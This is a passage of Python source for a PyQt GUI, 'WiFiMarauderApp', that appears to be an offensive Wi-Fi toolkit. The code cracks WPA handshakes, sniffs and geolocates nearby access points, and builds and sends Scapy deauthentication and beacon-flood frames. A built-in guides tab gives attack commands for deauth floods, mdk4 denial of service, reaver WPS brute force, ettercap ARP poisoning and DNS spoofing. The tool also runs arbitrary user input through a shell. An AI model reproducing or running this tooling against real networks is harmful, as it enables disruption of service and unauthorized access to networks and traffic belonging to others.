            QMessageBox.warning(self, "Crack Error", str(e))

    def stop_cracking(self):
        """Stop WPA cracking in progress."""
        try:
            self.crack_manager.stop()
            if hasattr(self, 'crack_timer'):
                self.crack_timer.stop()
            self.crack_progress.setRange(0, 100)
            self.crack_progress.setValue(0)
            self.crack_status.setText("Status: Stopped")
            handshake = self.crack_handshake.text().strip()
            wordlist = self.crack_wordlist.text().strip()
            attempts, total, key, done = self.crack_manager.progress()
            self.db_manager.insert_crack(handshake, wordlist, 'stopped', key or '')
            self.log(f"Stopped WPA cracking on {handshake}")
        except Exception as e:
            QMessageBox.warning(self, "Stop Error", str(e))

    def _update_crack_progress(self):
        """Update cracking progress bar and detect completion."""
        attempts, total, key, done = self.crack_manager.progress()
        if total and total > 0:
            self.crack_progress.setRange(0, total)
            self.crack_progress.setValue(min(attempts, total))
        else:
            self.crack_progress.setRange(0, 0)
        if key or done:
            self.finish_cracking(key)

    def finish_cracking(self, key):
        """Handle completion of cracking job."""
        if hasattr(self, 'crack_timer'):
            self.crack_timer.stop()
        self.crack_progress.setRange(0, 100)
        handshake = self.crack_handshake.text().strip()
        wordlist = self.crack_wordlist.text().strip()
        if key:
            self.crack_status.setText(f"Status: Key Found: {key}")
            QMessageBox.information(self, "Crack Complete", f"Key Found: {key}")
            status = 'completed'
        else:
            self.crack_status.setText("Status: Completed, no key found")
            QMessageBox.information(self, "Crack Complete", "No Key Found")
            status = 'completed'
        self.db_manager.insert_crack(handshake, wordlist, status, key or '')
        self.log(f"Finished WPA cracking on {handshake}: status={status}, key={key}")

    # ---------------------------
    # Vendor & Interface utility stubs
    # ---------------------------
    def load_vendors(self):
        """Load OUI vendor mappings for MAC address lookups."""
        return {}


    # ---------------------------
    # Interface Mode Controls
    # ---------------------------

    def _on_toggle_monitor(self):
        """Handle monitor mode toggle request."""
        iface = self.iface_selector.currentText()
        success = toggle_monitor_mode(iface)
        if success:
            QMessageBox.information(self, "Monitor Mode", f"Enabled monitor mode on {iface}")
            self.log(f"Monitor mode enabled on {iface}")
        else:
            QMessageBox.warning(self, "Monitor Mode Failed", f"Failed to enable monitor mode on {iface}")

    def create_interfaces_tab(self):
        """Tab for listing interfaces and toggling monitor mode."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.addWidget(QLabel("Available Interfaces:"))
        self.iface_selector = QComboBox()
        # Populate interface list using kit.iface
        self.iface_selector.addItems(detect_interfaces())
        layout.addWidget(self.iface_selector)
        mon_btn = QPushButton("Enable Monitor Mode")
        mon_btn.clicked.connect(lambda: self._on_toggle_monitor())
        layout.addWidget(mon_btn)
        tab.setLayout(layout)
        return tab
    
    def create_guides_tab(self):
        """Tab for tool usage guides: basic, advanced, and chaining examples."""
        tab = QWidget()
        layout = QHBoxLayout(tab)
        # Guide list
        self.guides_list = QListWidget()
        guides = [
            'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'mdk4', 'hostapd', 'kismet',
            'wash', 'reaver', 'ettercap', 'tcpdump', 'netcat', 'dnschef',
            'mitmproxy', 'nmap', 'msfconsole', 'zaproxy', 'wireshark', 'routersploit'
        ]
        self.guides_list.addItems(guides)
        self.guides_list.currentTextChanged.connect(self.show_guide)
        layout.addWidget(self.guides_list)
        # Guide display
        self.guide_view = QTextEdit()
        self.guide_view.setReadOnly(True)
        layout.addWidget(self.guide_view)
        return tab

    def show_guide(self, tool):
        """Display curated usage guide for the selected tool."""
        guide_texts = {
            'airodump-ng': (
                'Basic Usage:\nairodump-ng -i <interface>\n'
                'Advanced Usage:\nairodump-ng --write <file> --output-format csv -c 1,6,11 <interface>\n'
                'Chaining Example:\niaxcatng ... | grep -i ESSID'
            ),
            'aireplay-ng': (
                'Basic Deauth Attack:\naireplay-ng --deauth 10 -a <AP_BSSID> <interface>\n'
                'Advanced: Broadcast Deauth Flood:\naireplay-ng --deauth 0 -a <AP_BSSID> <interface>\n'
                'Chain: Trigger handshake capture then aircrack-ng.'
            ),
            'aircrack-ng': (
                'Basic Crack:\naircrack-ng -w <wordlist> <capture.cap>\n'
                'Advanced: Resume Sessions, Multiple Threads, Scripted Reporting.'
            ),
            'mdk4': (
                'Bandwidth Throttle: mdk4 <iface> t -a <BSSID> -i <intensity>\n'
                'Beacon Flood:     mdk4 <iface> b -a <BSSID> -c <channel>\n'
                'Auth DoS:         mdk4 <iface> a -a <BSSID>\n'
                'Deauth Flood:     mdk4 <iface> d -a <BSSID> -i <intensity>\n'
                'Chain: Use with airodump-ng capture.'
            ),
            'kismet': (
                'Start Kismet Server: kismet_server\n'
                'Web UI: http://localhost:2501\n'
                'Capture: kismet_capture <iface>'
            ),
            'wash': (
                'Scan WPS Networks: wash -i <interface>\n'
                'Options: -C to only show WPS-enabled APs.'
            ),
            'reaver': (
                'Basic Brute-Force: reaver -i <iface> -b <AP_BSSID> -vv\n'
                'With PIN:         reaver -i <iface> -b <AP_BSSID> -p <PIN>\n'
                'Chain: combine with wash scan for targets.'
            ),
            'ettercap': (
                'ARP Poisoning MiTM: ettercap -T -q -i <iface> -M arp:remote /<target>/ /<gateway>/\n'
                'Plugins: dns_spoof, http_fetch.'
            ),
            'tcpdump': (
                'Capture Packets: tcpdump -i <iface> -w capture.pcap\n'
                'View Filtered:   tcpdump -r capture.pcap port 80'
            ),
            'netcat': (
                'Listen Mode: nc -lvp 4444\n'
                'Connect Mode: nc <host> 4444\n'
                'File Transfer: nc -l 5555 > file & nc <host> 5555 < file'
            ),
            'dnschef': (
                'DNS Spoofing: dnschef -i <iface> --fakeip 192.168.1.100 --fakedomains example.com'
            ),
            'mitmproxy': (
                'HTTP Proxy: mitmproxy -p 8080\n'
                'HTTPS Intercept: mitmproxy --mode transparent'
            ),
            'nmap': (
                'Port Scan: nmap -sV 192.168.1.0/24\n'
                'Aggressive: nmap -A -T4 192.168.1.100'
            ),
            'msfconsole': (
                'Start Metasploit: msfconsole\n'
                'Quick Script:     msfconsole -q -r script.rc\n'
                'DB Scan:          db_nmap -v 192.168.1.0/24'
            ),
            'zaproxy': (
                'Start ZAP UI: zaproxy\n'
                'Spider via API: zap-cli spider <url>\n'
                'Scan via API:   zap-cli active-scan <url>'
            ),
            'wireshark': (
                'GUI Capture: wireshark\n'
                'CLI: tshark -i <iface> -w capture.pcap'
            ),
            'routersploit': (
                'Start: rsf.py or routersploit\n'
                'Modules: use scanners/autopwn\n'
                'Search: search exploit docker'
            )
        }
        text = guide_texts.get(tool, f"No guide available for {tool}.")
        self.guide_view.setPlainText(text)

    def create_tools_tab(self):
        """Tab for viewing tool help and running custom commands."""
        tab = QWidget()
        layout = QHBoxLayout(tab)
        # Tool list
        self.tools_list = QListWidget()
        tools = [
            'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'mdk4', 'hostapd', 'kismet',
            'wash', 'reaver', 'ettercap', 'tcpdump', 'netcat', 'dnschef',
            'mitmproxy', 'nmap', 'msfconsole', 'zaproxy', 'wireshark', 'routersploit'
        ]
        self.tools_list.addItems(tools)
        self.tools_list.currentTextChanged.connect(self.show_tool_help)
        layout.addWidget(self.tools_list)
        # Help display
        self.tool_help = QTextEdit()
        self.tool_help.setReadOnly(True)
        layout.addWidget(self.tool_help)
        # Custom command section
        custom_group = QGroupBox("Custom Command")
        custom_layout = QVBoxLayout(custom_group)
        self.custom_cmd_input = QLineEdit()
        self.custom_cmd_input.setPlaceholderText("Enter custom command, e.g., nmap -sV 192.168.1.1")
        custom_layout.addWidget(self.custom_cmd_input)
        run_btn = QPushButton("Run")
        run_btn.clicked.connect(self.run_custom_command)
        custom_layout.addWidget(run_btn)
        self.custom_output = QTextEdit()
        self.custom_output.setReadOnly(True)
        custom_layout.addWidget(self.custom_output)
        layout.addWidget(custom_group)
        return tab

    def show_tool_help(self, tool):
        """Display the --help output of the selected tool."""
        try:
            out = subprocess.check_output([tool, '--help'], stderr=subprocess.STDOUT)
            text = out.decode(errors='ignore')
        except Exception as e:
            text = f"Error retrieving help for {tool}: {e}"
        self.tool_help.setPlainText(text)

    def run_custom_command(self):
        """Run a custom shell command and display its output."""
        cmd = self.custom_cmd_input.text().strip()
        if not cmd:
            QMessageBox.warning(self, "Input Error", "Please enter a command to run.")
            return
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            text = out.decode(errors='ignore')
        except subprocess.CalledProcessError as e:
            text = e.output.decode(errors='ignore')
        except Exception as e:
            text = str(e)
        self.custom_output.setPlainText(text)

    # ---------------------------
    # Packet Sniffing & Mapping Methods
    # ---------------------------
    def start_sniffing(self):
        """Start asynchronous packet sniffing on the selected interface."""
        if not AsyncSniffer:
            QMessageBox.warning(self, "Scapy Missing", "Scapy not installed or available.")
            return
        iface = self.mapper_interface.currentText()
        if getattr(self, 'sniffer', None) and getattr(self.sniffer, 'running', False):
            QMessageBox.information(self, "Already Running", "Packet sniffer is already active.")
            return
        # Clear previous records
        self.ap_records = {}
        self.mapping_table.setRowCount(0)
        # Start sniffer
        try:
            self.sniffer = AsyncSniffer(iface=iface, prn=self.handle_packet, store=False)
            self.sniffer.start()
            self.log(f"Started packet sniffer on {iface}")
        except Exception as e:
            QMessageBox.warning(self, "Sniffer Error", f"Failed to start sniffer: {e}")

    def stop_sniffing(self):
        """Stop the asynchronous packet sniffer."""
        if getattr(self, 'sniffer', None) and getattr(self.sniffer, 'running', False):
            self.sniffer.stop()
            self.log("Stopped packet sniffer")
        else:
            QMessageBox.information(self, "Not Running", "Packet sniffer is not active.")

    def handle_packet(self, pkt):
        """Callback for each sniffed packet to update mapping records."""
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            # Determine BSSID & ESSID
            bssid = pkt.addr2
            essid = ""
            # Extract channel from DS Parameter Set (ID 3)
            channel = None
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if hasattr(elt, 'ID') and elt.ID == 3:
                    try:
                        # info is bytes([channel])
                        channel = elt.info[0]
                    except Exception:
                        channel = None
                    break
                elt = elt.payload.getlayer(Dot11Elt)
            if pkt.haslayer(Dot11Elt):
                try:
                    essid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                except Exception:
                    pass
            # Initialize or retrieve record with channel set
            rec = self.ap_records.get(bssid, { 'essid': essid, 'count': 0, 'vendor': self.lookup_vendor(bssid), 'channels': set() })
            if essid:
                rec['essid'] = essid
            # Update count and channel set
            rec['count'] += 1
            if 'channel' in locals() and channel:
                rec['channels'].add(channel)
            self.ap_records[bssid] = rec
            QTimer.singleShot(0, self.update_mapping_table)

    def update_mapping_table(self):
        """Refresh the mapping table with current AP records."""
        self.mapping_table.setRowCount(len(self.ap_records))
        for row, (bssid, rec) in enumerate(self.ap_records.items()):
            self.mapping_table.setItem(row, 0, QTableWidgetItem(bssid))
            self.mapping_table.setItem(row, 1, QTableWidgetItem(rec.get('essid', '')))
            self.mapping_table.setItem(row, 2, QTableWidgetItem(str(rec.get('count', 0))))
            self.mapping_table.setItem(row, 3, QTableWidgetItem(rec.get('vendor', '')))
        # Update scatter plot
        if pg and hasattr(self, 'map_plot'):
            channels = [next(iter(rec['channels'])) if rec.get('channels') else 0 for rec in self.ap_records.values()]
            counts = [rec.get('count', 0) for rec in self.ap_records.values()]
            self.map_plot.clear()
            self.map_plot.plot(channels, counts, pen=None, symbol='o', symbolSize=8)

    def lookup_vendor(self, bssid):
        """Lookup vendor name from OUI prefix."""
        # Use manuf library if available
        if mac_parser:
            try:
                return mac_parser.get_manuf(bssid) or ''
            except Exception:
                pass
        # Fallback to loaded vendor mapping (prefix lookup)
        prefix = bssid.upper().replace(':', '')[:6]
        return self.vendor_mapping.get(prefix, '')
    # ---------------------------
    # Geolocation Overlay
    # ---------------------------
    def generate_geo_map(self):
        """Generate and open a folium HTML map with AP markers based on geolocation."""
        try:
            import folium, webbrowser, tempfile
        except ImportError:
            QMessageBox.warning(self, "Folium Missing", "Folium or browser libs not available.")
            return
        # Initialize map centered at (0,0)
        m = folium.Map(location=[0, 0], zoom_start=2)
        # Use WigleClient if available for geolocation
        geoclient = None
        if 'WigleClient' in globals() and WigleClient:
            try:
                geoclient = WigleClient()
            except Exception:
                geoclient = None
        for bssid, rec in self.ap_records.items():
            latlon = None
            if geoclient and rec.get('essid'):
                try:
                    data = geoclient.search_networks(ssid=rec['essid'], results_per_page=1)
                    results = data.get('results') if isinstance(data, dict) else None
                    if results:
                        first = results[0]
                        lat = float(first.get('trilat', 0))
                        lon = float(first.get('trilong', 0))
                        latlon = (lat, lon)
                except Exception:
                    latlon = None
            # Fallback to skip if no coords
            if latlon:
                folium.Marker(latlon, popup=f"{rec.get('essid')} ({bssid})").add_to(m)
        # Save to temp file and open
        tmp = tempfile.NamedTemporaryFile(suffix='.html', delete=False)
        m.save(tmp.name)
        webbrowser.open(f"file://{tmp.name}")
    # ---------------------------
    # Packet Crafting & Injection Methods
    # ---------------------------
    def preview_packet(self):
        """Preview the packet structure based on selected type and parameters."""
        ptype = self.packet_type.currentText()
        target = self.packet_target.text().strip()
        param = self.packet_param.text().strip()
        try:
            if ptype == "Deauth Flood":
                pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target)/Dot11Deauth(reason=7)
            elif ptype == "Beacon Flood":
                ssid = target or "FakeAP"
                ch = int(param) if param.isdigit() else 1
                pkt = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")/Dot11Elt(ID="SSID", info=ssid)/Dot11Elt(ID="DSset", info=bytes([ch]))
            elif ptype in ["Custom TCP", "Custom UDP"]:
                ip_dst = target
                port = int(param) if param.isdigit() else 80
                if ptype == "Custom TCP":
                    pkt = IP(dst=ip_dst)/TCP(dport=port)/Raw(load=b"Hello")
                else:
                    pkt = IP(dst=ip_dst)/UDP(dport=port)/Raw(load=b"Hello")
            else:
                raise ValueError(f"Unknown packet type: {ptype}")
            QMessageBox.information(self, "Packet Preview", repr(pkt))
        except Exception as e:
            QMessageBox.warning(self, "Preview Error", str(e))

    def start_packet_crafting(self):
        """Craft and send a packet once using Scapy."""
        ptype = self.packet_type.currentText()
        target = self.packet_target.text().strip()
        param = self.packet_param.text().strip()
        iface = self.scan_interface.currentText()
        try:
            if ptype == "Deauth Flood":
                pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target)/Dot11Deauth(reason=7)
            elif ptype == "Beacon Flood":
                ssid = target or "FakeAP"
                ch = int(param) if param.isdigit() else 1
                pkt = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")/Dot11Elt(ID="SSID", info=ssid)/Dot11Elt(ID="DSset", info=bytes([ch]))
            elif ptype in ["Custom TCP", "Custom UDP"]:
                ip_dst = target
                port = int(param) if param.isdigit() else 80
                if ptype == "Custom TCP":
                    pkt = IP(dst=ip_dst)/TCP(dport=port)/Raw(load=b"Hello")
                else:
                    pkt = IP(dst=ip_dst)/UDP(dport=port)/Raw(load=b"Hello")
            else:
                raise ValueError(f"Unknown packet type: {ptype}")
            sendp(pkt, iface=iface, count=1)
            self.packet_status.setText(f"Sent 1 {ptype}")
            self.log(f"Sent packet type {ptype} to {target}")
        except Exception as e:
            QMessageBox.warning(self, "Send Error", str(e))
            self.packet_status.setText("Error")

# Alias for backward compatibility / tests
WiFiMarauderGUI = WiFiMarauderApp